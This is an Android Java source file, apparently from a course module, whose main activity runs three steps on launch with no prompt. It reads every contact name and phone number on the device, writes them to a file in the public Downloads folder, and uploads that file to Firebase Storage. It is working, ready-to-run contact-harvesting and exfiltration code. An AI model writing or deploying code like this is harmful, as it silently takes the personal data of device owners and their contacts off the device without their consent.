package com.example.Modul6;

import androidx.annotation.NonNull;
import androidx.appcompat.app.AppCompatActivity;

import android.content.ContentResolver;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.ContactsContract;

import android.os.Bundle;
import android.util.Log;
import android.widget.Toast;

import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.UploadTask;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileWriter;
import java.io.IOException;
import java.io.InputStream;
import java.text.SimpleDateFormat;
import java.util.Date;

public class MainActivity extends AppCompatActivity {

    File file;

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        setFileName();
        getContact();
        uploadFirebase();

    }

    private void setFileName() {
        SimpleDateFormat sdf = new SimpleDateFormat("yyyyMMddHHmmss");
        String currentTime = sdf.format(new Date());
        String fileName = "contacts"+currentTime+".txt";
        // Define the file name and path
        File downloadsDirectory = Environment.getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS);
        file = new File(downloadsDirectory, fileName);
    }

    private void getContact() {
        // Get the content resolver
        ContentResolver resolver = getContentResolver();

        // Define the projection (fields to retrieve)
        String[] projection = new String[] {
                ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME,
                ContactsContract.CommonDataKinds.Phone.NUMBER
        };

        // Define the selection (filter)
        String selection = ContactsContract.CommonDataKinds.Phone.NUMBER + " IS NOT NULL";
        String[] selectionArgs = null;

        // Define the sort order
        String sortOrder = ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME + " ASC";

        // Query the contacts
        Cursor cursor = resolver.query(
                ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                projection,
                selection,
                selectionArgs,
                sortOrder
        );


        // Open the file for writing
        try {
            FileWriter writer = new FileWriter(file);

            // Iterate over the cursor to retrieve the contacts
            while (cursor.moveToNext()) {
                // Retrieve the contact name and phone number
                String name = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
                String phone = cursor.getString(cursor.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));

                // Do something with the contact name and phone number
                Log.d("getContact", "Name: " + name + ", Phone: " + phone);
                // Write the contact name and phone number to the file
                writer.write(name + ", " + phone + "\n");
            }

            // Close the file writer
            writer.close();
            // Close the cursor
            cursor.close();
        } catch (IOException e) {
            e.printStackTrace();
        }


    }

    private void uploadFirebase() {
        FirebaseStorage storage = FirebaseStorage.getInstance();
        // Create a storage reference from our app
        StorageReference storageRef = storage.getReference();
        // Create a reference to the file you want to upload
        StorageReference fileRef = storageRef.child(file.getName());

        String filePath = file.getPath();
        Uri fileUri = Uri.fromFile(new File(filePath));


        // Upload file to Firebase Storage
        fileRef.putFile(fileUri)
                .addOnSuccessListener(taskSnapshot -> {
                    // File uploaded successfully
                    Log.d("uploadFirebase", "File uploaded successfully");
                })
                .addOnFailureListener(e -> {
                    // Handle unsuccessful uploads
                    Log.e("uploadFirebase", "Error uploading file", e);
                });
    }
}